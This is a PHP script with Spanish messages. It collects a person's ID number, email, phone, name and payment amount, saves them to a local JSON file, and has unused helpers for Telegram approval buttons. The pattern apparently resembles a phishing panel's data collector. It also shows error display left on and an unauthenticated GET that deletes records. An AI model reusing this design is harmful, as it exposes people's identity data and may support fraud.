<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$USED_FILE = 'used_transactions.json';

function loadConfig()
{
    $configFile = __DIR__ . '/../config.php';

    if (!file_exists($configFile)) return null;

    $config = require $configFile;

    if (!isset($config['bot_token']) && !isset($config['telegram_bot_token']) || 
        !isset($config['chat_id']) && !isset($config['telegram_chat_id']))
        return null;

    return [
        'token' => $config['bot_token'] ?? $config['telegram_bot_token'],
        'chat_id' => $config['chat_id'] ?? $config['telegram_chat_id']
    ];
}

function sendToTelegram($token, $chatId, $text, $keyboard)
{
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);

    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

function editTelegramMessage($token, $chatId, $messageId, $newText)
{
    $payload = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $newText,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['inline_keyboard' => []])
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);

    curl_exec($ch);
    curl_close($ch);
}

function getTransactions()
{
    return file_exists($GLOBALS['USED_FILE'])
        ? json_decode(file_get_contents($GLOBALS['USED_FILE']), true)
        : [];
}

function saveTransaction($id, $data)
{
    $all = getTransactions();
    $all[$id] = $data;
    file_put_contents($GLOBALS['USED_FILE'], json_encode($all));
}

function deleteTransaction($id)
{
    $all = getTransactions();
    unset($all[$id]);
    file_put_contents($GLOBALS['USED_FILE'], json_encode($all));
}

$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => '❌ No se pudo cargar config.php']);
    exit;
}

$BOT_TOKEN = $config['token'];
$CHAT_ID   = $config['chat_id'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $data = json_decode(file_get_contents('php://input'), true);

    $tid = $data['transactionId'] ?? ('TID_' . time());
    $identificacion = $data['identificacion'] ?? '';
    $correo = $data['correo'] ?? '';
    $celular = $data['celular'] ?? '';
    $cedula = $data['cedula'] ?? '';
    $persona = $data['persona'] ?? '';
    $monto = $data['monto'] ?? '0';
    $mensaje = $data['mensaje'] ?? '';

    $text = $mensaje . "\n\n<b>Selecciona una opción:</b>";

    $keyboard = [
        [
            ['text' => '✅ Pago aceptado', 'callback_data' => "si:{$tid}"],
            ['text' => '❌ Aún no pagó',   'callback_data' => "no:{$tid}"]
        ],
        [
            ['text' => '📸 Captura', 'callback_data' => "cap:{$tid}"]
        ]
    ];

    // Notificaciones de Telegram deshabilitadas

    saveTransaction($tid, [
        'tid' => $tid,
        'identificacion' => $identificacion,
        'correo' => $correo,
        'celular' => $celular,
        'cedula' => $cedula,
        'persona' => $persona,
        'monto' => $monto,
        'message_id' => 0,
        'created_at' => time(),
        'status' => 'pending'
    ]);

    echo json_encode(['ok' => true, 'tid' => $tid]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];

    $t = getTransactions()[$tid] ?? null;
    if ($t) {
        deleteTransaction($tid);
        echo json_encode(['ok' => true, 'action' => 'confirmado']);
        exit;
    }

    echo json_encode(['ok' => false]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método inválido']);
exit;
?>

